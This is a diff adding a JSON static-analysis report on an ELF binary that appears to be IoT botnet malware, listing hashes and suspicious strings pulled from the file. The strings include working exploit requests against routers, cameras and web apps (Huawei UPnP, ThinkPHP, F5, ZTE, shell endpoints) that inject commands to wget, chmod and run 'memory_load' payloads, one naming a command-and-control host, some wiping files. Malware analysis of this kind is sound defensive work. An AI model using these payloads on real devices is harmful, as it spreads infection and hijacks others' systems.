@@ -1,0 +1,97 @@
+{
+    "report_generated": "2026-03-23T21:24:13.332901",
+    "file": "/home/amruta/unzip/8d385e7b91c3cdd6c17a071f238602d4837d5deed5f213f93d02c15674367a10.elf",
+    "filename": "8d385e7b91c3cdd6c17a071f238602d4837d5deed5f213f93d02c15674367a10.elf",
+    "hashes": {
+        "MD5": "e94b944770efd2eb05f62df35077e8c8",
+        "SHA1": "2aeabd92af4c459cbc76e7354b168e3d9d640bb0",
+        "SHA256": "8d385e7b91c3cdd6c17a071f238602d4837d5deed5f213f93d02c15674367a10",
+        "SHA512": "ad629ee40aeacd765cd7b92901544f8151fbb070b9926a081cf3f522861def8a50d2349ae73dd12b79dc80eed7c8b82ca95f299092179ccf7d59a7a52bd87451"
+    },
+    "suspicious_imports": {
+        "total_hits": 66,
+        "categories_flagged": 7,
+        "matches": {
+            "Shell Execution": [
+                "GET /shell?cd+/tmp;rm+-rf+*;wget http://",
+                "shell",
+                "system",
+                "Interrupted system call",
+                "Too many open files in system",
+                "Read-only file system",
+                "Interrupted system call should be restarted"
+            ],
+            "Network": [
+                "POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1",
+                "(cd /tmp;wget http://",
+                " HTTP/1.0",
+                "GET / HTTP/1.1",
+                "/memory_bin_dir/memory_load.mips -O- | sh&timezone_offset=-05:00&timezone=XXX+5YYY,M3.2.0/02:00:00,M11.1.0/02:00:00&tzArray_index=13&use_dst=0 HTTP/1.1",
+                "GET /pingHost.cmd?action=add&targetHostAddress=;ps|sh HTTP/1.1",
+                "POST /goform/websLogin HTTP/1.1",
+                " HTTP/1.1",
+                "GET /config/getuser?index=0 HTTP/1.1",
+                "/memory_bin_dir/memory_load.mips -O- | sh; HTTP/1.1",
+                "Accept-Encoding: gzip, deflate",
+                "Accept: */*",
+                "GET /cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F",
+                "%2Fmemory_bin_dir%2Fmemory_load.mips+%3B+chmod+777+memory_load.mips+%3B+sh+memory_load.mips&loginUser=a&loginPwd=a HTTP/1.1",
+                "POST /mgmt/tm/util/bash HTTP/1.1",
+                "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'wget http://",
+                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
+                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g cnc.nomeum.net -l /tmp/.memory -r /memory_bin_dir/memory_load.mips; /bin/busybox chmod 777 * /tmp/.memory; /tmp/.memory huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
+                "GET /shell?cd+/tmp;rm+-rf+*;wget http://",
+                "/memory_bin_dir/memory_load.mips; chmod 777 memory_load.mips; ./memory_load.mips; rm -rf * HTTP/1.1",
+                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "POST /picsdesc.xml HTTP/1.1",
+                "Accept: /",
+                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding//%22%3E<s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://",
+                "POST /cgi-bin/admin/setparam.cgi HTTP/1.1",
+                "Accept-Language: en-US,en;q=0.8",
+                "HTTP/1.1",
+                "http",
+                "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://",
+                "/memory_bin_dir/memory_load.x86; chmod 777 memory_load.x86; ./memory_load.x86' HTTP/1.1",
+                "%2Fmemory_bin_dir%2Fmemory_load.mips%3B%20chmod%20%2Bx%20memory_load.mips%3B%20.%2Fmemory_load.mips%29&TimeZone=01:00 HTTP/1.1",
+                "/cgi-bin/operator/servetest?cmd=ftp&ServerName=%24%28cd%20%2Ftmp%3Bwget%20http%3A%2F%2F",
+                "POST /login.gch HTTP/1.1",
+                "POST /manager_dev_ping_t.gch HTTP/1.1",
+                "&Host=;$(cd /tmp; rm -rf *; wget http://",
+                "POST /getpage.gch?pid=1001&logout=1 HTTP/1.1",
+                "Communication error on send",
+                "Socket operation on non-socket",
+                "Protocol wrong type for socket",
+                "Socket type not supported",
+                "Cannot send after transport endpoint shutdown"
+            ],
+            "File Manipulation": [
+                "/memory_bin_dir/memory_load.mips;chmod +x memory_load.mips;./memory_load.mips selfrep.apache)",
+                "%2Fmemory_bin_dir%2Fmemory_load.mips+%3B+chmod+777+memory_load.mips+%3B+sh+memory_load.mips&loginUser=a&loginPwd=a HTTP/1.1",
+                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g cnc.nomeum.net -l /tmp/.memory -r /memory_bin_dir/memory_load.mips; /bin/busybox chmod 777 * /tmp/.memory; /tmp/.memory huawei.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
+                "/memory_bin_dir/memory_load.mips; chmod 777 memory_load.mips; ./memory_load.mips; rm -rf * HTTP/1.1",
+                "/memory_bin_dir/memory_load.mips; chmod +x memory_load.mips; ./memory_load.mips </NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>",
+                "/memory_bin_dir/memory_load.x86; chmod 777 memory_load.x86; ./memory_load.x86' HTTP/1.1",
+                "/memory_bin_dir/memory_load.mips; chmod 777 memory_load.mips; ./memory_load.mips selfrep.zte)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit",
+                "Invalid cross-device link",
+                "Link number out of range",
+                "Link has been severed",
+                "Attempting to link in too many shared libraries"
+            ],
+            "Memory Manipulation": [
+                "mmap of a spare page failed!",
+                "Unable to mmap file"
+            ],
+            "Process Manipulation": [
+                "Software caused connection abort"
+            ],
+            "Keylogging / Spying": [
+                "Read-only file system"
+            ],
+            "Persistence": [
+                "At^B1",
+                "<at/",
+                ".init"
+            ]
+        }
+    }
+}
